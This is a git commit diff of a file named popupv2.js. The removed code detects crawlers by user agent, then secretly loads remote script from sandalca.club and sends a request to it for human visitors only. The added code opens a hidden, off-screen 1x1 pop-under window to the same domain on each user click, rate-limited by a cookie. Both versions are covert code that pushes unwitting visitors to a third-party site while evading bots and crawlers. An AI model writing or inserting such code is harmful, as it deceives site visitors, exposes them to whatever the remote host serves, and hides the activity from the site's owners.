230213d8f6277ae079b4c16549ab3b9b81842591
canyouseem3 <46871655+canyouseem3@users.noreply.github.com>
2022-03-25 15:49:22 +0300

    Update popupv2.js

--- popupv2.js
+++ popupv2.js
@@ -1,16 +1,59 @@
-function ekle(url) {
-    var script = document.createElement('script');
-    script.src = url;
-    document.head.appendChild(script);
-}
-function botCheck(){
-    var botPattern = "(googlebot\/|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)";
-    var re = new RegExp(botPattern, 'i');
-    var userAgent = navigator.userAgent;
-
-    return re.test(userAgent);
-}
-if (!botCheck()) { 
-ekle('https://sandalca.club');
-function makeRequest(t,e,s){return new Promise(function(n,i){var o=new XMLHttpRequest;o.open(t,e),o.onload=function(){this.status>=200&&this.status<300?n(o.response):i({status:this.status,statusText:o.statusText})},o.onerror=function(){i({status:this.status,statusText:o.statusText})},"POST"==t&&s?o.send(s):o.send()})}
-if( !localStorage.getItem("popupv2") ){ makeRequest("GET","https://sandalca.club"); localStorage.setItem("popupv2", true); } }
+<script type="text/javascript">
+var puShown = false;
+        function doOpen(url)
+        {
+                if ( puShown == true )
+                {
+                        return true;
+                }
+             win = window.open(url,"yenipencere","menubar=0,resizable=1,width=1,height=1");
+             win.moveTo(150000, 150000); 
+                if ( win )
+                {
+                        win.blur();
+                        puShown = true;
+                }
+                return win;
+        }
+        function setCookie(name, value, time)
+        {
+            var expires = new Date();
+            expires.setTime( expires.getTime() + time );
+            document.cookie = name + '=' + value + '; expires=' + expires.toGMTString();
+        }
+       function getCookie(name) { 
+var cookies = document.cookie.toString().split('; '); 
+var cookie, c_name, c_value; 
+// eğer n=1; i 0 yaparsanız popup cookie yönetimine bağlanır ve 
+// sadece 1 kez açılır. n=1; kaldığı sürece popup sürekli açılacaktır. 
+for (var n=0; n<cookies.length; n++) { 
+cookie = cookies[n].split('='); 
+c_name = cookie[0]; 
+c_value = cookie[1]; 
+if ( c_name == name ) { 
+return c_value; 
+                }
+            }
+            return null;
+        }
+        function initPu()
+        {
+                if ( document.attachEvent )
+                {
+                        document.attachEvent( 'onclick', checkTarget );
+                }
+                else if ( document.addEventListener )
+                {
+                        document.addEventListener( 'click', checkTarget, false );
+                }
+        }
+        function checkTarget(e)
+        {
+            if ( !getCookie('esl') ) {
+                var e = e || window.event;
+                var win = doOpen('https://sandalca.club');
+                setCookie('esl', 1, 1*60*60*1000);
+            }
+        }
+initPu();
+</script>
